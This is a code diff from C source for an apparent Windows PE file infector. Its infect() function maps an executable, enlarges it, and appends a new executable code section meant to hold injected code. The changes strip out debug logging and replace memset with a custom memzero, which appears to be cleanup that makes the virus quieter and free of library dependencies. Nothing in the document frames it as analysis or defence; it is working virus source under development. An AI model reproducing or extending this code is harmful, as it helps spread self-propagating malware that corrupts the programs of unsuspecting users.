@@ -3,8 +3,6 @@
 int infect(const char* filename, data_t* data) {
   file_view_t fileView;
 
-  PRINT_DEBUG("infecting %s\n", filename);
-
   memzero(&fileView, sizeof(file_view_t));
 
   if (open_file_view(filename, &fileView, data) != 0){
@@ -16,8 +14,6 @@ int infect(const char* filename, data_t* data) {
     return 2;
   }
 
-  PRINT_DEBUG("src size: %lu B\n", fileView.size);
-
   IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);
 
   uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
@@ -27,9 +23,7 @@ int infect(const char* filename, data_t* data) {
   if (open_file_view(filename, &fileView, data) != 0){
     return 1;
   }
-
-  PRINT_DEBUG("ext size: %lu B\n", fileView.size);
-
+  
   ntHeaders = get_nt_header(fileView.startAddress);
 
   IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*) (ntHeaders + 1);
@@ -73,11 +67,6 @@ void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS
   sectionHeader->SizeOfRawData = align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + align_value((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
-  PRINT_DEBUG("creating section:\n");
-  PRINT_DEBUG("\tvirtual size = 0x%Xl\n", (unsigned int)sectionHeader->Misc.VirtualSize);
-  PRINT_DEBUG("\tsize of raw data = 0x%X\n", (unsigned int)sectionHeader->SizeOfRawData);
-  PRINT_DEBUG("\tpointer to raw data = 0x%X\n", (unsigned int)sectionHeader->PointerToRawData);
-  PRINT_DEBUG("\tcharacteristics = 0x%X\n", (unsigned int)sectionHeader->Characteristics);
 }
 
 int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
@@ -136,5 +125,5 @@ void close_file_view(file_view_t* fileView, data_t* data) {
   data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
   data->functions.closeHandle(fileView->hMap);
   data->functions.closeHandle(fileView->hFile);
-  memset(fileView, 0, sizeof(file_view_t));
+  memzero(fileView, sizeof(file_view_t));
 }
